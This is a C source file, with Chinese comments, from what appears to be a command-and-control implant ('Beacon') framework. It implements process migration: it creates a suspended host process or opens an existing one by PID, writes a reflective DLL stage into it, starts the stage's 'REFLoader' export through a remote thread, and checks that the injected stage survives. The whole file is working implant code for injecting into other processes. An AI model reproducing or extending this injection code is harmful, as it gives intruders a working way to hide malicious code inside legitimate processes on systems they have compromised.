#include "beacon_migrate.h"
#include "beacon_inject.h"

#define MIGRATE_START_WAIT_MS 1500u

/* 校验当前 Beacon 是否具备注入请求架构的能力。 */
static BOOL MigrateLocalSupportsMachine(WORD requested_machine,
                                        CHAR* err,
                                        SIZE_T err_size)
{
    WORD beacon_machine = InjectCurrentMachine();

    if (requested_machine == 0) {
        if (err) strcpy_s(err, err_size, "invalid migrate arch");
        return FALSE;
    }

    if (beacon_machine == IMAGE_FILE_MACHINE_I386 &&
        requested_machine == IMAGE_FILE_MACHINE_AMD64) {
        if (err) strcpy_s(err, err_size,
                          "migrate x64 stage is unsupported from x86 beacon");
        return FALSE;
    }

    return TRUE;
}

/* 校验 stage PE 架构与请求 arch 一致，并返回 stage machine。 */
static BOOL MigrateValidateStageMachine(const MigrateRequest* req,
                                        WORD* stage_machine,
                                        CHAR* err,
                                        SIZE_T err_size)
{
    WORD requested_machine;
    WORD parsed_machine = 0;

    if (!req) {
        if (err) strcpy_s(err, err_size, "invalid migrate request");
        return FALSE;
    }

    requested_machine = InjectMachineFromArch(req->arch);
    if (!MigrateLocalSupportsMachine(requested_machine, err, err_size)) {
        return FALSE;
    }
    if (!InjectImageMachine(&req->stage, "migrate stage",
                            &parsed_machine, err, err_size)) {
        return FALSE;
    }
    if (parsed_machine != requested_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate arch mismatch: requested=%s stage=%s",
                             InjectMachineName(requested_machine),
                             InjectMachineName(parsed_machine));
        return FALSE;
    }

    if (stage_machine) {
        *stage_machine = parsed_machine;
    }
    return TRUE;
}

/* 校验目标进程架构与 stage 架构一致，避免跨架构注入。 */
static BOOL MigrateValidateTargetMachine(HANDLE process,
                                         WORD stage_machine,
                                         CHAR* err,
                                         SIZE_T err_size)
{
    WORD target_machine = 0;

    if (!InjectGetProcessMachine(process, "migrate target",
                                 &target_machine, err, err_size)) {
        return FALSE;
    }
    if (target_machine != stage_machine) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate arch mismatch: stage=%s target=%s",
                             InjectMachineName(stage_machine),
                             InjectMachineName(target_machine));
        return FALSE;
    }
    return TRUE;
}

/* 格式化远程线程即时状态：委托给共用工具 InjectFormatRemoteThreadStatus。 */
static VOID MigrateFormatRemoteThreadStatus(HANDLE thread,
                                            CHAR* out,
                                            SIZE_T out_size)
{
    InjectFormatRemoteThreadStatus(thread, out, out_size);
}

/* 准备 reflective stage：写入目标进程并解析 REFLoader 远程入口。 */
static BOOL MigratePrepareRemoteReflective(HANDLE process,
                                           const ByteBuf* stage,
                                           PVOID* remote_image,
                                           SIZE_T* remote_image_size,
                                           PVOID* remote_entry,
                                           CHAR* err,
                                           SIZE_T err_size)
{
    InjectRequest req;
    InjectResult result;

    if (remote_image) *remote_image = NULL;
    if (remote_image_size) *remote_image_size = 0;
    if (remote_entry) *remote_entry = NULL;
    if (err && err_size) err[0] = '\0';

    if (!process || !stage || !stage->data || stage->len < sizeof(IMAGE_DOS_HEADER) ||
        !remote_image || !remote_entry) {
        if (err) strcpy_s(err, err_size, "invalid migrate remote reflective request");
        return FALSE;
    }

    ZeroMemory(&req, sizeof(req));
    InjectResultInit(&result);
    req.method = INJECT_METHOD_REFLECTIVE;
    req.process = process;
    req.image = stage;
    req.entry_export = "REFLoader";
    req.image_label = "stage";
    req.invalid_request_error = "invalid migrate remote reflective request";
    req.missing_export_error = "migrate stage missing REFLoader export";
    if (!InjectPrepare(&req, &result, err, err_size)) return FALSE;

    *remote_image = result.remote_image;
    if (remote_image_size) *remote_image_size = result.remote_image_size;
    *remote_entry = result.remote_entry;
    return TRUE;
}

/* 启动 migrate stage 的远程线程；Migrate 当前只做一次创建尝试。 */
static BOOL MigrateCreateRemoteThreadChecked(HANDLE process,
                                             PVOID remote_entry,
                                             HANDLE* remote_thread,
                                             CHAR* err,
                                             SIZE_T err_size)
{
    return InjectCreateRemoteThread(process, remote_entry, NULL,
                                    1, 0,
                                    "invalid migrate remote thread request",
                                    remote_thread, err, err_size);
}

/* 启动后短暂观察远程线程/目标进程，过滤立即崩溃的迁移。 */
static BOOL MigrateAssessStart(HANDLE process,
                               HANDLE thread,
                               DWORD pid,
                               CHAR* status,
                               SIZE_T status_size,
                               CHAR* err,
                               SIZE_T err_size)
{
    DWORD wait_rc;
    DWORD exit_code = STILL_ACTIVE;
    CHAR thread_status[96];
    CHAR process_status[96];

    if (status && status_size) status[0] = '\0';
    if (err && err_size) err[0] = '\0';

    wait_rc = WaitForSingleObject(thread, MIGRATE_START_WAIT_MS);
    MigrateFormatRemoteThreadStatus(thread, thread_status, sizeof(thread_status));
    if (!InjectRemoteProcessAlive(process, process_status, sizeof(process_status)) &&
        wait_rc != WAIT_TIMEOUT) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate remote stage exited early: pid:%lu %s; %s",
                             (ULONG)pid, thread_status, process_status);
        return FALSE;
    }

    if (wait_rc == WAIT_OBJECT_0 &&
        GetExitCodeThread(thread, &exit_code) &&
        exit_code != 0) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate remote stage exited early: pid:%lu %s; %s",
                             (ULONG)pid, thread_status, process_status);
        return FALSE;
    }

    if (status) {
        _snprintf_s(status, status_size, _TRUNCATE,
                    "%s; %s", thread_status, process_status);
    }
    return TRUE;
}

/* 创建挂起宿主进程，供 spawn-stage 在写入 stage 后再恢复主线程。 */
static BOOL MigrateCreateSuspendedHost(const WCHAR* command_line,
                                       HANDLE* process,
                                       HANDLE* primary_thread,
                                       DWORD* pid,
                                       CHAR* err,
                                       SIZE_T err_size)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    if (process) *process = NULL;
    if (primary_thread) *primary_thread = NULL;
    if (pid) *pid = 0;
    if (err && err_size) err[0] = '\0';

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    if (!CreateProcessW(NULL, (LPWSTR)command_line, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate spawn CreateProcess failed: %lu",
                             (ULONG)GetLastError());
        return FALSE;
    }

    if (process) *process = pi.hProcess;
    if (primary_thread) *primary_thread = pi.hThread;
    if (pid) *pid = pi.dwProcessId;
    return TRUE;
}

/* migrate spawn：创建新宿主、写入 stage、恢复宿主并启动 REFLoader。 */
BOOL MigrateSpawnStage(const MigrateRequest* req,
                       DWORD* pid,
                       CHAR* status,
                       SIZE_T status_size,
                       CHAR* err,
                       SIZE_T err_size)
{
    WORD stage_machine = 0;
    CHAR command_line[MIGRATE_CMDLINE_MAX];
    WCHAR* command_line_w = NULL;
    HANDLE process = NULL;
    HANDLE primary_thread = NULL;
    HANDLE remote_thread = NULL;
    PVOID remote_image = NULL;
    PVOID remote_entry = NULL;
    SIZE_T remote_image_size = 0;
    DWORD spawned_pid = 0;
    BOOL ok = FALSE;

    if (pid) *pid = 0;
    if (status && status_size) status[0] = '\0';
    if (err && err_size) err[0] = '\0';

    if (!req || !pid) {
        if (err) strcpy_s(err, err_size, "invalid migrate spawn request");
        return FALSE;
    }
    if (!MigrateValidateStageMachine(req, &stage_machine, err, err_size)) {
        return FALSE;
    }
    if (!InjectBuildSpawnCommandLine(req->spawn_path, req->spawn_args,
                                     command_line, sizeof(command_line))) {
        if (err) strcpy_s(err, err_size, "migrate spawn command line too long");
        return FALSE;
    }

    command_line_w = Utf8ToWide(command_line);
    if (!command_line_w) {
        if (err) strcpy_s(err, err_size, "migrate spawn string conversion failed");
        return FALSE;
    }

    if (!MigrateCreateSuspendedHost(command_line_w,
                                    &process, &primary_thread, &spawned_pid,
                                    err, err_size)) {
        HeapFree(GetProcessHeap(), 0, command_line_w);
        return FALSE;
    }

    /* 写入 stage 前先确认宿主架构，失败时保持进程仍可被安全终止。 */
    if (!MigrateValidateTargetMachine(process, stage_machine, err, err_size)) {
        goto cleanup;
    }
    if (!MigratePrepareRemoteReflective(process, &req->stage,
                                        &remote_image, &remote_image_size,
                                        &remote_entry, err, err_size)) {
        goto cleanup;
    }

    /* stage 已准备好后再恢复宿主主线程，降低半初始化窗口。 */
    ResumeThread(primary_thread);
    CloseHandle(primary_thread);
    primary_thread = NULL;
    WaitForInputIdle(process, 1000);

    if (!MigrateCreateRemoteThreadChecked(process, remote_entry,
                                          &remote_thread, err, err_size)) {
        goto cleanup;
    }
    if (!MigrateAssessStart(process, remote_thread, spawned_pid,
                            status, status_size, err, err_size)) {
        goto cleanup;
    }

    *pid = spawned_pid;
    ok = TRUE;

cleanup:
    /* 失败时清理远程资源并终止本次 spawn 出来的宿主。 */
    if (!ok) {
        if (remote_thread) {
            WaitForSingleObject(remote_thread, 500);
            CloseHandle(remote_thread);
            remote_thread = NULL;
        }
        if (remote_image && process) {
            InjectResult cleanup_remote;
            InjectResultInit(&cleanup_remote);
            cleanup_remote.remote_image = remote_image;
            cleanup_remote.remote_image_size = remote_image_size;
            InjectFreeRemote(process, &cleanup_remote);
            remote_image = NULL;
            remote_image_size = 0;
            remote_entry = NULL;
        }
        if (process) {
            if (WaitForSingleObject(process, 0) != WAIT_OBJECT_0) {
                TerminateProcess(process, 1);
            }
            CloseHandle(process);
            process = NULL;
        }
        if (primary_thread) {
            CloseHandle(primary_thread);
            primary_thread = NULL;
        }
    } else {
        if (remote_thread) {
            CloseHandle(remote_thread);
        }
        if (process) {
            CloseHandle(process);
        }
    }

    HeapFree(GetProcessHeap(), 0, command_line_w);
    return ok;
}

/* migrate inject：打开已有进程、写入 stage 并启动 REFLoader。 */
BOOL MigrateInjectStage(const MigrateRequest* req,
                        CHAR* status,
                        SIZE_T status_size,
                        CHAR* err,
                        SIZE_T err_size)
{
    WORD stage_machine = 0;
    HANDLE process = NULL;
    HANDLE remote_thread = NULL;
    PVOID remote_image = NULL;
    PVOID remote_entry = NULL;
    SIZE_T remote_image_size = 0;
    BOOL ok = FALSE;

    if (status && status_size) status[0] = '\0';
    if (err && err_size) err[0] = '\0';

    if (!req || !req->target_pid) {
        if (err) strcpy_s(err, err_size, "invalid migrate inject request");
        return FALSE;
    }
    if (!MigrateValidateStageMachine(req, &stage_machine, err, err_size)) {
        return FALSE;
    }

    process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_VM_READ | SYNCHRONIZE,
                          FALSE, req->target_pid);
    if (!process) {
        if (err) _snprintf_s(err, err_size, _TRUNCATE,
                             "migrate OpenProcess failed: %lu",
                             (ULONG)GetLastError());
        return FALSE;
    }

    /* 既有进程不属于本次 migrate，失败时只释放本次分配的远程资源。 */
    if (!MigrateValidateTargetMachine(process, stage_machine, err, err_size)) {
        goto cleanup;
    }
    if (!MigratePrepareRemoteReflective(process, &req->stage,
                                        &remote_image, &remote_image_size,
                                        &remote_entry, err, err_size)) {
        goto cleanup;
    }
    if (!MigrateCreateRemoteThreadChecked(process, remote_entry,
                                          &remote_thread, err, err_size)) {
        goto cleanup;
    }
    if (!MigrateAssessStart(process, remote_thread, req->target_pid,
                            status, status_size, err, err_size)) {
        goto cleanup;
    }

    ok = TRUE;

cleanup:
    /* 不终止既有目标进程，只回收本次准备的 stage 和线程句柄。 */
    if (!ok) {
        if (remote_thread) {
            WaitForSingleObject(remote_thread, 500);
            CloseHandle(remote_thread);
            remote_thread = NULL;
        }
        if (remote_image && process) {
            InjectResult cleanup_remote;
            InjectResultInit(&cleanup_remote);
            cleanup_remote.remote_image = remote_image;
            cleanup_remote.remote_image_size = remote_image_size;
            InjectFreeRemote(process, &cleanup_remote);
            remote_image = NULL;
            remote_image_size = 0;
            remote_entry = NULL;
        }
    } else if (remote_thread) {
        CloseHandle(remote_thread);
    }

    if (process) {
        CloseHandle(process);
    }
    return ok;
}
